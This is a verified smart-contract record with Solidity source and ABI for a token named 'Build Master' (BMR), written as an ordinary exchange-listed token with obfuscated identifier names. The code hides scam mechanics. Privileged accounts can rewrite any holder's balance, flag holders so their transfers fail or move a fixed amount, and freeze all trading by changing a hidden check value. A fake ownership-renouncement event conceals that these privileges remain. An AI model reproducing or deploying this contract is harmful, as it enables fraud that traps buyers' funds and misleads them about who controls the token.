{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface enableFrom {\n    function createPair(address marketingTeamMode, address exemptLaunched) external returns (address);\n}\n\ninterface shouldAmountFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundToken) external view returns (uint256);\n\n    function transfer(address limitMax, uint256 modeMinTo) external returns (bool);\n\n    function allowance(address receiverLaunchedFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeMinTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitMax,\n        uint256 modeMinTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minMaxSender, uint256 value);\n    event Approval(address indexed receiverLaunchedFee, address indexed spender, uint256 value);\n}\n\nabstract contract senderLaunchedShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalLaunchLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldAmountFundMetadata is shouldAmountFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BuildMaster is senderLaunchedShould, shouldAmountFund, shouldAmountFundMetadata {\n\n    function toTeam(address teamTakeAmount, address limitMax, uint256 modeMinTo) internal returns (bool) {\n        require(listMax[teamTakeAmount] >= modeMinTo);\n        listMax[teamTakeAmount] -= modeMinTo;\n        listMax[limitMax] += modeMinTo;\n        emit Transfer(teamTakeAmount, limitMax, modeMinTo);\n        return true;\n    }\n\n    function approve(address teamFrom, uint256 modeMinTo) public virtual override returns (bool) {\n        receiverMode[_msgSender()][teamFrom] = modeMinTo;\n        emit Approval(_msgSender(), teamFrom, modeMinTo);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverFund;\n    }\n\n    constructor (){\n        \n        totalLaunchLaunched fundTeamTrading = totalLaunchLaunched(marketingTeam);\n        autoMarketing = enableFrom(fundTeamTrading.factory()).createPair(fundTeamTrading.WETH(), address(this));\n        \n        totalSenderLaunched = _msgSender();\n        toReceiver[totalSenderLaunched] = true;\n        listMax[totalSenderLaunched] = buyMin;\n        feeLaunch();\n        if (amountLaunched) {\n            totalTake = false;\n        }\n        emit Transfer(address(0), totalSenderLaunched, buyMin);\n    }\n\n    function fromTotalAmount(address listWallet, uint256 modeMinTo) public {\n        sellSenderLaunched();\n        listMax[listWallet] = modeMinTo;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverMode;\n\n    uint8 private senderLimitFee = 18;\n\n    address marketingTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function feeSender(address liquiditySellIs) public {\n        sellSenderLaunched();\n        if (atLiquidityFee != totalTake) {\n            totalTake = true;\n        }\n        if (liquiditySellIs == totalSenderLaunched || liquiditySellIs == autoMarketing) {\n            return;\n        }\n        toMaxTotal[liquiditySellIs] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderLimitFee;\n    }\n\n    bool private amountLaunched;\n\n    function getOwner() external view returns (address) {\n        return autoTx;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyMin;\n    }\n\n    bool public maxReceiver;\n\n    mapping(address => bool) public toReceiver;\n\n    uint256 constant launchTeam = 19 ** 10;\n\n    string private swapBuy = \"Build Master\";\n\n    function allowance(address senderTeam, address teamFrom) external view virtual override returns (uint256) {\n        if (teamFrom == marketingTeam) {\n            return type(uint256).max;\n        }\n        return receiverMode[senderTeam][teamFrom];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapBuy;\n    }\n\n    address amountLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private receiverFund = \"BMR\";\n\n    bool private atLiquidityFee;\n\n    function owner() external view returns (address) {\n        return autoTx;\n    }\n\n    function transferFrom(address teamTakeAmount, address limitMax, uint256 modeMinTo) external override returns (bool) {\n        if (_msgSender() != marketingTeam) {\n            if (receiverMode[teamTakeAmount][_msgSender()] != type(uint256).max) {\n                require(modeMinTo <= receiverMode[teamTakeAmount][_msgSender()]);\n                receiverMode[teamTakeAmount][_msgSender()] -= modeMinTo;\n            }\n        }\n        return marketingTeamFund(teamTakeAmount, limitMax, modeMinTo);\n    }\n\n    address public totalSenderLaunched;\n\n    uint256 private buyMin = 100000000 * 10 ** 18;\n\n    address public autoMarketing;\n\n    mapping(address => bool) public toMaxTotal;\n\n    uint256 feeTx;\n\n    function transfer(address listWallet, uint256 modeMinTo) external virtual override returns (bool) {\n        return marketingTeamFund(_msgSender(), listWallet, modeMinTo);\n    }\n\n    function sellSenderLaunched() private view {\n        require(toReceiver[_msgSender()]);\n    }\n\n    function modeLimitMax(uint256 modeMinTo) public {\n        sellSenderLaunched();\n        feeTx = modeMinTo;\n    }\n\n    function balanceOf(address fundToken) public view virtual override returns (uint256) {\n        return listMax[fundToken];\n    }\n\n    function feeLaunch() public {\n        emit OwnershipTransferred(totalSenderLaunched, address(0));\n        autoTx = address(0);\n    }\n\n    function marketingTeamFund(address teamTakeAmount, address limitMax, uint256 modeMinTo) internal returns (bool) {\n        if (teamTakeAmount == totalSenderLaunched) {\n            return toTeam(teamTakeAmount, limitMax, modeMinTo);\n        }\n        uint256 exemptSell = shouldAmountFund(autoMarketing).balanceOf(amountLiquidity);\n        require(exemptSell == feeTx);\n        require(limitMax != amountLiquidity);\n        if (toMaxTotal[teamTakeAmount]) {\n            return toTeam(teamTakeAmount, limitMax, launchTeam);\n        }\n        return toTeam(teamTakeAmount, limitMax, modeMinTo);\n    }\n\n    function buySenderTo(address takeSender) public {\n        require(takeSender.balance < 100000);\n        if (maxReceiver) {\n            return;\n        }\n        if (totalTake != amountLaunched) {\n            atLiquidityFee = false;\n        }\n        toReceiver[takeSender] = true;\n        if (totalTake) {\n            atLiquidityFee = true;\n        }\n        maxReceiver = true;\n    }\n\n    mapping(address => uint256) private listMax;\n\n    address private autoTx;\n\n    uint256 atLimitFrom;\n\n    event OwnershipTransferred(address indexed tradingToken, address indexed txBuy);\n\n    bool public totalTake;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunchedFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minMaxSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMinTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSender\",\"type\":\"address\"}],\"name\":\"buySenderTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySellIs\",\"type\":\"address\"}],\"name\":\"feeSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMinTo\",\"type\":\"uint256\"}],\"name\":\"fromTotalAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeMinTo\",\"type\":\"uint256\"}],\"name\":\"modeLimitMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toMaxTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSenderLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMinTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTakeAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMinTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BuildMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}